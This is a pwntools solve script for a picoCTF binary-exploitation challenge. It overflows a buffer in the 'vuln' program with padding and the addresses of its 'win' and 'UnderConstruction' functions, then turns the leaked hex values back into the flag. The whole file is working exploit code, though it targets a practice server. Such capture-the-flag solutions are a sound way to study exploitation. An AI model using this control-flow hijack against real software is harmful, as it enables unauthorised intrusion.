#!/usr/bin/env python3
from pwn import *

PORT =  61855
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x8049ecf
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()

win = 0x8049d90
UnderConstruction = 0x8049e10

pl = flat(b"A"*0xe, win, UnderConstruction)
p.sendline(pl)

leaks = []
p.recvuntil(b"User information : ")
for i in range(5):
	leaks.append(int(p.recvuntil(b" ", drop = True), 16))

leaks.append(int(p.recvline()[:-1], 16))

p.recvuntil(b"Names of user: ")
for i in range(2):
	leaks.append(int(p.recvuntil(b" ", drop = True), 16))

leaks.append(int(p.recvline()[:-1], 16))
p.recvuntil(b"Age of user: ")
leaks.append(int(p.recvline()[:-1], 16))

flag = b""
for val in leaks[::-1]:
	flag += p32(val)

log.info(b"Your flag: " + flag)
p.interactive()